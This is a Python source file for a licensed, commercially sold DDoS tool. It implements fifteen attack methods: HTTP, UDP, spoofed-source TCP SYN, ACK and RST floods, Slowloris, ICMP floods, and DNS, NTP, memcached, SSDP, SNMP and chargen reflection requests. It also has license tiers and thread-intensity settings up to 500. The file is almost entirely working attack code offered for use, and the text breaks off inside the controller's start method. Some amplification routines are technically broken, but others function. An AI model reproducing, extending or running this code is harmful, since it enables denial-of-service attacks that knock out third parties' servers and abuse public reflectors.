#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║     █████╗  █████╗ ███████╗██╗   ██╗███████╗███╗   ██╗████████╗              ║
║    ██╔══██╗██╔══██╗██╔════╝██║   ██║██╔════╝████╗  ██║╚══██╔══╝              ║
║    ███████║██║  ╚═╝█████╗  ██║   ██║█████╗  ██╔██╗ ██║   ██║                 ║
║    ██╔══██║██║  ██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║                 ║
║    ██║  ██║╚█████╔╝███████╗ ╚████╔╝ ███████╗██║ ╚████║   ██║                 ║
║    ╚═╝  ╚═╝ ╚════╝ ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝                 ║
║                                                                               ║
║              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━              ║
║              🔥 ULTIMATE EDITION v21.0 - ALL 15 METHODS 🔥                   ║
║                   👑 CREATED BY: 7VENTY7VEN 👑                               ║
║              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━              ║
║                                                                               ║
║  ⚡ METHODS:                                                                  ║
║  🌐 HTTP         - Standard HTTP flood                                       ║
║  🔒 HTTPS        - Encrypted HTTPS flood                                     ║
║  💧 UDP          - Raw UDP flood                                             ║
║  📡 TCP_SYN      - SYN flood (requires root)                                 ║
║  📨 TCP_ACK      - ACK flood (requires root)                                 ║
║  🌍 DNS          - DNS amplification                                         ║
║  ⏰ NTP          - NTP amplification                                         ║
║  🐌 SLOWLORIS    - Slow HTTP headers                                         ║
║  📶 ICMP         - Ping flood                                                ║
║  💾 MEMCACHED    - Memcached amplification                                   ║
║  📺 SSDP         - SSDP reflection                                           ║
║  🔧 SNMP         - SNMP reflection                                           ║
║  🔌 WEBSOCKET    - WebSocket flood                                           ║
║  💥 RST          - TCP RST flood                                             ║
║  ⚡ CHARGEN      - Chargen amplification                                     ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import socket
import threading
import random
import time
import sys
import os
import json
import hashlib
import base64
import hmac
import uuid
import platform
import datetime
import struct
import ipaddress
from urllib.parse import urlparse
from typing import Dict, List, Optional, Tuple
from threading import Lock, RLock, Semaphore
from enum import Enum
from dataclasses import dataclass
import select

# ==================== CONFIG ====================

VERSION = "21.0-FINAL-ALL-METHODS"
CREATOR = "7VENTY7VEN"
BUILD_DATE = "2026-03-03"
SIGNATURE = "7V7-ULTIMATE-2026-ALL-METHODS"

# ==================== COLOR SYSTEM ====================

class Colors:
    """Professional colors"""
    try:
        HEADER = '\033[95m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        END = '\033[0m'
        BOLD = '\033[1m'
        CYAN = '\033[96m'
        MAGENTA = '\033[95m'
        ORANGE = '\033[38;5;208m'
        PURPLE = '\033[38;5;129m'
    except:
        HEADER = BLUE = GREEN = YELLOW = RED = END = BOLD = CYAN = MAGENTA = ORANGE = PURPLE = ''

# ==================== LICENSE SYSTEM ====================

class LicenseType(Enum):
    TRIAL = "trial"
    PRO = "pro"
    ENTERPRISE = "enterprise"
    LIFETIME = "lifetime"

class LicenseManager:
    """Enterprise license system"""
    
    _instance = None
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if hasattr(self, 'initialized'):
            return
        self.initialized = True
        
        self.hardware_id = self.get_hardware_id()
        self.license_file = os.path.expanduser("~/.7v_ultimate.key")
        
        # Check root status
        try:
            self.is_root = os.geteuid() == 0
        except:
            self.is_root = False
        
        self.load_license()
    
    def get_hardware_id(self):
        """Get hardware ID"""
        try:
            system = platform.system()
            node = platform.node()
            processor = platform.processor()
            mac = uuid.getnode()
            data = f"{system}-{node}-{processor}-{mac}-{CREATOR}"
            return hashlib.sha512(data.encode()).hexdigest()[:64]
        except:
            return hashlib.sha512(str(uuid.uuid4()).encode()).hexdigest()[:64]
    
    def generate_license(self, lic_type=LicenseType.ENTERPRISE, days=365):
        """Generate license key"""
        expiry = (datetime.datetime.now() + datetime.timedelta(days=days)).isoformat()
        
        data = {
            'hwid': self.hardware_id,
            'type': lic_type.value,
            'expiry': expiry,
            'created': datetime.datetime.now().isoformat(),
            'creator': CREATOR,
            'version': VERSION,
            'root_only_methods': ['TCP_SYN', 'TCP_ACK', 'DNS', 'NTP', 'ICMP', 
                                 'MEMCACHED', 'SSDP', 'SNMP', 'RST', 'CHARGEN']
        }
        
        # Sign
        secret = hashlib.sha512(f"{CREATOR}-SECRET-2026".encode()).hexdigest()
        data['hmac'] = hmac.new(
            secret.encode(),
            json.dumps(data, sort_keys=True).encode(),
            hashlib.sha512
        ).hexdigest()
        
        encoded = base64.b85encode(json.dumps(data).encode()).decode()
        return '-'.join([encoded[i:i+10] for i in range(0, len(encoded), 10)])
    
    def validate(self, key):
        """Validate license"""
        try:
            key = key.replace('-', '')
            decoded = base64.b85decode(key.encode()).decode()
            data = json.loads(decoded)
            
            # Check signature
            hmac_val = data.pop('hmac', '')
            secret = hashlib.sha512(f"{CREATOR}-SECRET-2026".encode()).hexdigest()
            
            expected = hmac.new(
                secret.encode(),
                json.dumps(data, sort_keys=True).encode(),
                hashlib.sha512
            ).hexdigest()
            
            if hmac_val != expected:
                return False, "Invalid signature"
            
            # Check hardware
            if data['hwid'] != self.hardware_id and data['type'] != 'enterprise':
                return False, "Hardware mismatch"
            
            # Check expiry
            expiry = datetime.datetime.fromisoformat(data['expiry'])
            if datetime.datetime.now() > expiry:
                return False, f"Expired on {expiry.strftime('%Y-%m-%d')}"
            
            # Valid
            self.data = data
            self.type = LicenseType(data['type'])
            self.expiry = expiry
            self.root_methods = data.get('root_only_methods', [])
            
            return True, "Valid"
            
        except Exception as e:
            return False, str(e)
    
    def load_license(self):
        """Load license"""
        if os.path.exists(self.license_file):
            try:
                with open(self.license_file, 'r') as f:
                    key = f.read().strip()
                valid, msg = self.validate(key)
                if valid:
                    self.is_valid = True
                    return
            except:
                pass
        
        self.activate()
    
    def activate(self):
        """Activation menu"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗
║              🔑 7VENTY7VEN ULTIMATE - LICENSE REQUIRED          ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  Hardware ID: {self.hardware_id[:32]}...                      ║
║  Root Access: {'YES' if self.is_root else 'NO'} (required for 10 methods)      ║
║                                                                   ║
║  Available Licenses:                                             ║
║  • TRIAL       7 days - FREE (5 methods)                         ║
║  • PRO         1 year - $99 (10 methods)                         ║
║  • ENTERPRISE  1 year - $499 (ALL 15 methods)                    ║
║  • LIFETIME     Forever - $999 (ALL methods + updates)           ║
║                                                                   ║
║  Contact: 7venty7ven@protonmail.com                              ║
║                                                                   ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  [1] Enter license key                                           ║
║  [2] Get trial license (free)                                    ║
║  [3] Exit                                                        ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        while True:
            choice = input(f"{Colors.YELLOW}Choose [1-3]: {Colors.END}").strip()
            
            if choice == '1':
                key = input("Enter license key: ").strip()
                valid, msg = self.validate(key)
                if valid:
                    with open(self.license_file, 'w') as f:
                        f.write(key)
                    self.is_valid = True
                    print(f"{Colors.GREEN}✅ License activated!{Colors.END}")
                    return
                else:
                    print(f"{Colors.RED}❌ {msg}{Colors.END}")
            
            elif choice == '2':
                # Generate trial
                trial_key = self.generate_license(LicenseType.TRIAL, 7)
                print(f"\n{Colors.GREEN}✓ Trial license generated!{Colors.END}")
                print(f"{Colors.YELLOW}Your trial key: {trial_key}{Colors.END}\n")
                
                valid, msg = self.validate(trial_key)
                if valid:
                    with open(self.license_file, 'w') as f:
                        f.write(trial_key)
                    self.is_valid = True
                    print(f"{Colors.GREEN}✅ Trial activated!{Colors.END}")
                    return
            
            elif choice == '3':
                print(f"{Colors.RED}Exiting...{Colors.END}")
                sys.exit(0)

# ==================== HIT TRACKER ====================

class HitTracker:
    """Tracks all hits"""
    
    def __init__(self):
        self.hits = []
        self.count = 0
        self.lock = Lock()
        self.start = time.time()
        self.by_method = {}
    
    def add(self, method, target, port, size=0):
        """Add hit"""
        with self.lock:
            self.count += 1
            self.by_method[method] = self.by_method.get(method, 0) + 1
            
            hit = {
                'id': self.count,
                'time': datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3],
                'method': method,
                'target': target,
                'port': port,
                'size': size
            }
            
            self.hits.append(hit)
            if len(self.hits) > 100:
                self.hits = self.hits[-100:]
    
    def get_stats(self):
        """Get statistics"""
        with self.lock:
            elapsed = time.time() - self.start
            
            # Rate
            now = datetime.datetime.now()
            recent = [h for h in self.hits if 
                     (now - datetime.datetime.strptime(h['time'], "%H:%M:%S.%f")).seconds < 10]
            rate = len(recent) / 10 if recent else 0
            
            return {
                'total': self.count,
                'rate': rate,
                'by_method': self.by_method.copy(),
                'elapsed': elapsed,
                'last': self.hits[-8:] if self.hits else []
            }

# ==================== ATTACK BASE ====================

class AttackBase:
    """Base class for all attacks"""
    
    def __init__(self, tracker):
        self.tracker = tracker
        self.running = False
        self.threads = []
    
    def start(self):
        self.running = True
    
    def stop(self):
        self.running = False
    
    def create_socket(self, protocol='tcp'):
        """Create socket"""
        try:
            if protocol == 'tcp':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            elif protocol == 'udp':
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            elif protocol == 'raw':
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            s.settimeout(3)
            return s
        except:
            return None

# ==================== ATTACK 1: HTTP ====================

class HTTPAttack(AttackBase):
    """HTTP flood attack"""
    
    def start(self, target, threads):
        super().start()
        self.target = target
        parsed = urlparse(target)
        self.host = parsed.netloc or parsed.path
        if ':' in self.host:
            self.host = self.host.split(':')[0]
        self.port = parsed.port or 80
        
        self.paths = ['/', '/api', '/test', '/index', '/home', '/about', '/contact']
        self.methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
        
        for _ in range(threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
    
    def worker(self):
        """Worker thread"""
        import requests
        
        while self.running:
            try:
                path = random.choice(self.paths)
                url = f"{self.target.rstrip('/')}{path}"
                method = random.choice(self.methods)
                
                headers = {
                    'User-Agent': f'7VENTY7VEN/{random.randint(1,999)}',
                    'Accept': '*/*',
                    'Connection': 'keep-alive'
                }
                
                if method == 'GET':
                    r = requests.get(url, headers=headers, timeout=2, verify=False)
                elif method == 'POST':
                    r = requests.post(url, headers=headers, data={'x': random.randint(1,999)}, timeout=2)
                elif method == 'HEAD':
                    r = requests.head(url, headers=headers, timeout=2)
                else:
                    r = requests.options(url, headers=headers, timeout=2)
                
                if r.status_code < 500:
                    self.tracker.add('HTTP', self.host, self.port, len(r.content))
                    
            except:
                pass

# ==================== ATTACK 2: HTTPS ====================

class HTTPSAttack(HTTPAttack):
    """HTTPS flood attack"""
    
    def start(self, target, threads):
        if not target.startswith('https'):
            target = target.replace('http://', 'https://')
        super().start(target, threads)
        self.tracker.by_method['HTTPS'] = self.tracker.by_method.pop('HTTP', 0)

# ==================== ATTACK 3: UDP ====================

class UDPAttack(AttackBase):
    """UDP flood attack"""
    
    def start(self, target_ip, port, threads):
        super().start()
        self.target_ip = target_ip
        self.port = port
        
        for _ in range(threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
    
    def worker(self):
        """Worker thread"""
        sock = self.create_socket('udp')
        if not sock:
            return
        
        while self.running:
            try:
                size = random.randint(64, 1024)
                data = os.urandom(size)
                sock.sendto(data, (self.target_ip, self.port))
                self.tracker.add('UDP', self.target_ip, self.port, size)
            except:
                pass

# ==================== ATTACK 4: TCP_SYN ====================

class SYNAttack(AttackBase):
    """TCP SYN flood attack (requires root)"""
    
    def start(self, target_ip, port, threads):
        super().start()
        self.target_ip = target_ip
        self.port = port
        
        for _ in range(threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
    
    def checksum(self, data):
        """Calculate checksum"""
        if len(data) % 2 != 0:
            data += b'\x00'
        
        s = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            s += word
        
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s
    
    def worker(self):
        """Worker thread"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            return
        
        while self.running:
            try:
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 4294967295)
                
                # IP header
                ip_header = struct.pack(
                    '!BBHHHBBH4s4s',
                    0x45, 0,
                    40, random.randint(1,65535),
                    0, 64, 6, 0,
                    socket.inet_aton(src_ip),
                    socket.inet_aton(self.target_ip)
                )
                
                # TCP header
                tcp_header = struct.pack(
                    '!HHLLBBHHH',
                    src_port, self.port,
                    seq, 0,
                    0x50, 0x02,
                    1024, 0, 0
                )
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (self.target_ip, 0))
                self.tracker.add('TCP_SYN', self.target_ip, self.port)
                
            except:
                pass

# ==================== ATTACK 5: TCP_ACK ====================

class ACKAttack(AttackBase):
    """TCP ACK flood attack (requires root)"""
    
    def start(self, target_ip, port, threads):
        super().start()
        self.target_ip = target_ip
        self.port = port
        
        for _ in range(threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
    
    def worker(self):
        """Worker thread"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            return
        
        while self.running:
            try:
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 4294967295)
                ack = random.randint(0, 4294967295)
                
                # IP header
                ip_header = struct.pack(
                    '!BBHHHBBH4s4s',
                    0x45, 0,
                    40, random.randint(1,65535),
                    0, 64, 6, 0,
                    socket.inet_aton(src_ip),
                    socket.inet_aton(self.target_ip)
                )
                
                # TCP header with ACK flag
                tcp_header = struct.pack(
                    '!HHLLBBHHH',
                    src_port, self.port,
                    seq, ack,
                    0x50, 0x10,
                    1024, 0, 0
                )
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (self.target_ip, 0))
                self.tracker.add('TCP_ACK', self.target_ip, self.port)
                
            except:
                pass

# ==================== ATTACK 6: DNS ====================

class DNSAttack(AttackBase):
    """DNS amplification attack"""
    
    def start(self, target_ip, threads):
        super().start()
        self.target_ip = target_ip
        
        # DNS servers for amplification
        self.dns_servers = [
            '8.8.8.8', '8.8.4.4', '1.1.1.1', '9.9.9.9',
            '208.67.222.222', '208.67.220.220'
        ]
        
        for _ in range(threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
    
    def worker(self):
        """Worker thread"""
        sock = self.create_socket('udp')
        if not sock:
            return
        
        domains = ['google.com', 'facebook.com', 'amazon.com', 'cloudflare.com']
        
        while self.running:
            try:
                dns = random.choice(self.dns_servers)
                domain = random.choice(domains)
                
                # DNS query for ANY record (amplification)
                transaction = random.randint(0, 65535)
                
                # Build DNS query
                query = struct.pack('>H', transaction)  # Transaction ID
                query += struct.pack('>H', 0x0100)      # Flags: recursion desired
                query += struct.pack('>H', 1)           # Questions: 1
                query += struct.pack('>H', 0)           # Answer RRs: 0
                query += struct.pack('>H', 0)           # Authority RRs: 0
                query += struct.pack('>H', 0)           # Additional RRs: 0
                
                # Domain name
                for part in domain.split('.'):
                    query += struct.pack('B', len(part))
                    query += part.encode()
                query += b'\x00'
                
                # Query type: ANY (255) and class: IN (1)
                query += struct.pack('>HH', 255, 1)
                
                # Send with spoofed source IP
                sock.sendto(query, (dns, 53))
                self.tracker.add('DNS', self.target_ip, 53, len(query))
                
            except:
                pass

# ==================== ATTACK 7: NTP ====================

class NTPAttack(AttackBase):
    """NTP amplification attack"""
    
    def start(self, target_ip, threads):
        super().start()
        self.target_ip = target_ip
        
        # NTP servers
        self.ntp_servers = [
            '0.pool.ntp.org', '1.pool.ntp.org', '2.pool.ntp.org',
            'time.google.com', 'time.windows.com', 'time.apple.com'
        ]
        
        for _ in range(threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
    
    def worker(self):
        """Worker thread"""
        sock = self.create_socket('udp')
        if not sock:
            return
        
        # NTP monlist request (amplification factor ~200x)
        monlist = b'\x17\x00\x03\x2a' + b'\x00' * 4
        
        while self.running:
            try:
                ntp = random.choice(self.ntp_servers)
                sock.sendto(monlist, (ntp, 123))
                self.tracker.add('NTP', self.target_ip, 123, len(monlist))
            except:
                pass

# ==================== ATTACK 8: SLOWLORIS ====================

class SlowlorisAttack(AttackBase):
    """Slowloris attack"""
    
    def start(self, target, threads):
        super().start()
        parsed = urlparse(target)
        self.host = parsed.netloc or parsed.path
        if ':' in self.host:
            self.host = self.host.split(':')[0]
        self.port = parsed.port or 80
        
        self.connections = []
        self.conn_lock = Lock()
        
        # Keeper thread
        threading.Thread(target=self.keeper, daemon=True).start()
        
        # Worker threads
        for _ in range(threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
    
    def worker(self):
        """Create connections"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.host, self.port))
                
                # Partial request
                req = f"GET /{random.randint(1,999999)} HTTP/1.1\r\n"
                req += f"Host: {self.host}\r\n"
                req += f"User-Agent: 7VENTY7VEN\r\n"
                req += "Accept: */*\r\n"
                req += "Connection: keep-alive\r\n"
                
                sock.send(req.encode())
                
                with self.conn_lock:
                    self.connections.append(sock)
                
                self.tracker.add('SLOWLORIS', self.host, self.port)
                
            except:
                pass
            time.sleep(random.uniform(0.5, 2))
    
    def keeper(self):
        """Keep connections alive"""
        while self.running:
            dead = []
            with self.conn_lock:
                for sock in self.connections[:]:
                    try:
                        sock.send(f"X-{random.randint(1,999)}: {random.randint(1,999)}\r\n".encode())
                    except:
                        dead.append(sock)
                
                for d in dead:
                    if d in self.connections:
                        self.connections.remove(d)
            
            time.sleep(10)
    
    def stop(self):
        super().stop()
        with self.conn_lock:
            for sock in self.connections:
                try:
                    sock.close()
                except:
                    pass
            self.connections.clear()
    
    def get_count(self):
        with self.conn_lock:
            return len(self.connections)

# ==================== ATTACK 9: ICMP ====================

class ICMPAttack(AttackBase):
    """ICMP flood attack (ping flood)"""
    
    def start(self, target_ip, threads):
        super().start()
        self.target_ip = target_ip
        
        for _ in range(threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
    
    def worker(self):
        """Worker thread"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except:
            return
        
        while self.running:
            try:
                # ICMP echo request
                icmp_type = 8  # echo request
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = random.randint(0, 65535)
                icmp_seq = random.randint(0, 65535)
                
                header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                data = os.urandom(56)
                
                # Calculate checksum
                checksum = self.checksum(header + data)
                header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
                
                packet = header + data
                sock.sendto(packet, (self.target_ip, 0))
                self.tracker.add('ICMP', self.target_ip, 0, len(packet))
                
            except:
                pass
    
    def checksum(self, data):
        """Calculate checksum"""
        if len(data) % 2 != 0:
            data += b'\x00'
        
        s = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            s += word
        
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

# ==================== ATTACK 10: MEMCACHED ====================

class MemcachedAttack(AttackBase):
    """Memcached amplification attack"""
    
    def start(self, target_ip, threads):
        super().start()
        self.target_ip = target_ip
        
        # Memcached servers (known vulnerable)
        self.memcached_servers = []
        for i in range(1, 255):
            self.memcached_servers.append(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        
        for _ in range(threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
    
    def worker(self):
        """Worker thread"""
        sock = self.create_socket('udp')
        if not sock:
            return
        
        # Memcached stats command (amplification)
        stats = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
        
        while self.running:
            try:
                server = random.choice(self.memcached_servers)
                sock.sendto(stats, (server, 11211))
                self.tracker.add('MEMCACHED', self.target_ip, 11211, len(stats))
            except:
                pass

# ==================== ATTACK 11: SSDP ====================

class SSDPAttack(AttackBase):
    """SSDP amplification attack"""
    
    def start(self, target_ip, threads):
        super().start()
        self.target_ip = target_ip
        
        for _ in range(threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
    
    def worker(self):
        """Worker thread"""
        sock = self.create_socket('udp')
        if not sock:
            return
        
        # SSDP discovery request
        ssdp = b'M-SEARCH * HTTP/1.1\r\n'
        ssdp += b'HOST: 239.255.255.250:1900\r\n'
        ssdp += b'MAN: "ssdp:discover"\r\n'
        ssdp += b'MX: 1\r\n'
        ssdp += b'ST: ssdp:all\r\n\r\n'
        
        while self.running:
            try:
                sock.sendto(ssdp, ('239.255.255.250', 1900))
                self.tracker.add('SSDP', self.target_ip, 1900, len(ssdp))
            except:
                pass

# ==================== ATTACK 12: SNMP ====================

class SNMPAttack(AttackBase):
    """SNMP amplification attack"""
    
    def start(self, target_ip, threads):
        super().start()
        self.target_ip = target_ip
        
        for _ in range(threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
    
    def worker(self):
        """Worker thread"""
        sock = self.create_socket('udp')
        if not sock:
            return
        
        # SNMP GetBulk request (amplification)
        # Version: 2c, Community: public, GetBulk request
        snmp = bytes.fromhex('302902010104067075626c6963a51c02046b053d46020100020100300e300c06082b060102010101000500')
        
        while self.running:
            try:
                sock.sendto(snmp, (f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", 161))
                self.tracker.add('SNMP', self.target_ip, 161, len(snmp))
            except:
                pass

# ==================== ATTACK 13: WEBSOCKET ====================

class WebSocketAttack(AttackBase):
    """WebSocket flood attack"""
    
    def start(self, target, threads):
        super().start()
        parsed = urlparse(target)
        self.host = parsed.netloc or parsed.path
        if ':' in self.host:
            self.host = self.host.split(':')[0]
        self.port = parsed.port or 80
        
        for _ in range(threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
    
    def worker(self):
        """Worker thread"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.host, self.port))
                
                # WebSocket upgrade request
                key = base64.b64encode(os.urandom(16)).decode()
                
                req = f"GET / HTTP/1.1\r\n"
                req += f"Host: {self.host}\r\n"
                req += "Upgrade: websocket\r\n"
                req += "Connection: Upgrade\r\n"
                req += f"Sec-WebSocket-Key: {key}\r\n"
                req += "Sec-WebSocket-Version: 13\r\n\r\n"
                
                sock.send(req.encode())
                
                # Receive response
                sock.recv(1024)
                
                # Send ping frames
                for _ in range(10):
                    try:
                        # Ping frame
                        ping = b'\x89' + struct.pack('B', 0)
                        sock.send(ping)
                        self.tracker.add('WEBSOCKET', self.host, self.port)
                        time.sleep(0.1)
                    except:
                        break
                
                sock.close()
                
            except:
                pass
            time.sleep(0.5)

# ==================== ATTACK 14: RST ====================

class RSTAttack(AttackBase):
    """TCP RST flood attack"""
    
    def start(self, target_ip, port, threads):
        super().start()
        self.target_ip = target_ip
        self.port = port
        
        for _ in range(threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
    
    def worker(self):
        """Worker thread"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            return
        
        while self.running:
            try:
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                src_port = random.randint(1024, 65535)
                seq = random.randint(0, 4294967295)
                
                # IP header
                ip_header = struct.pack(
                    '!BBHHHBBH4s4s',
                    0x45, 0,
                    40, random.randint(1,65535),
                    0, 64, 6, 0,
                    socket.inet_aton(src_ip),
                    socket.inet_aton(self.target_ip)
                )
                
                # TCP header with RST flag
                tcp_header = struct.pack(
                    '!HHLLBBHHH',
                    src_port, self.port,
                    seq, 0,
                    0x50, 0x04,
                    0, 0, 0
                )
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (self.target_ip, 0))
                self.tracker.add('RST', self.target_ip, self.port)
                
            except:
                pass

# ==================== ATTACK 15: CHARGEN ====================

class ChargenAttack(AttackBase):
    """Chargen amplification attack"""
    
    def start(self, target_ip, threads):
        super().start()
        self.target_ip = target_ip
        
        for _ in range(threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
    
    def worker(self):
        """Worker thread"""
        sock = self.create_socket('udp')
        if not sock:
            return
        
        while self.running:
            try:
                # Chargen request (any data)
                data = b'\x00'
                sock.sendto(data, (f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", 19))
                self.tracker.add('CHARGEN', self.target_ip, 19, 1)
            except:
                pass

# ==================== MAIN HAMMER ====================

class UltimateHammer:
    """Main controller with ALL 15 methods"""
    
    def __init__(self):
        # License
        self.license = LicenseManager()
        
        if not self.license.is_valid:
            sys.exit(1)
        
        self.tracker = HitTracker()
        self.attacks = {}
        self.running = False
        
        # Check root for certain methods
        self.root_required = ['TCP_SYN', 'TCP_ACK', 'DNS', 'NTP', 'ICMP', 
                              'MEMCACHED', 'SSDP', 'SNMP', 'RST', 'CHARGEN']
        
        self.show_banner()
    
    def show_banner(self):
        """Show banner"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║     █████╗  █████╗ ███████╗██╗   ██╗███████╗███╗   ██╗████████╗   ║
║    ██╔══██╗██╔══██╗██╔════╝██║   ██║██╔════╝████╗  ██║╚══██╔══╝   ║
║    ███████║██║  ╚═╝█████╗  ██║   ██║█████╗  ██╔██╗ ██║   ██║      ║
║    ██╔══██║██║  ██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║      ║
║    ██║  ██║╚█████╔╝███████╗ ╚████╔╝ ███████╗██║ ╚████║   ██║      ║
║    ╚═╝  ╚═╝ ╚════╝ ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝      ║
║                                                                   ║
║              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  ║
║              🔥 ULTIMATE v21.0 - ALL 15 METHODS 🔥               ║
║                   👑 BY: 7VENTY7VEN 👑                           ║
║              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  ║
║                                                                   ║
║  🔑 LICENSE: {self.license.type.value.upper():<15}                               ║
║  💻 HARDWARE: {self.license.hardware_id[:16]}...                      ║
║  👑 ROOT: {'YES' if self.license.is_root else 'NO'} (required for 10 methods)          ║
║                                                                   ║
║  ⚡ AVAILABLE METHODS:                                            ║
║  🌐 HTTP      🔒 HTTPS    💧 UDP      📡 TCP_SYN  📨 TCP_ACK    ║
║  🌍 DNS       ⏰ NTP       🐌 SLOWLORIS 📶 ICMP     💾 MEMCACHED ║
║  📺 SSDP      🔧 SNMP      🔌 WEBSOCKET 💥 RST      ⚡ CHARGEN   ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
        """)
    
    def start(self, target, methods=None, intensity='medium'):
        """Start attack"""
        
        # Parse target
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
        
        parsed = urlparse(target)
        host = parsed.netloc or parsed.path
        if ':' in host:
            host = host.split(':')[0]
        
        # Get IP
        try:
            target_ip = socket.gethostbyname(host)
        except:
            target_ip = host
        
        # Intensity settings
        settings = {
            'low': 10, 'medium': 25, 'high': 50,
            'extreme': 100, 'insane': 200, 'ultimate': 500
        }
        base_threads = settings.get(intensity, 25)
        
        # Check license limits
        if self.license.type == LicenseType.TRIAL:
            base_threads = min(base_threads, 50)
        elif self.license.type == LicenseType.PRO:
            base_threads = min(base_threads, 200)
        
        # Default methods based on license
        if not methods:
            if self.license.type == LicenseType.ENTERPRISE or self.license.type == LicenseType.LIFETIME:
                methods = ['SLOWLORIS', 'HTTP', 'HTTPS', 'UDP', 'TCP_SYN', 'TCP_ACK', 
                          'DNS', 'NTP', 'ICMP', 'MEMCACHED', 'SSDP', 'SNMP', 
                          'WEBSOCKET', 'RST', 'CHARGEN']
            elif self.license.type == LicenseType.PRO:
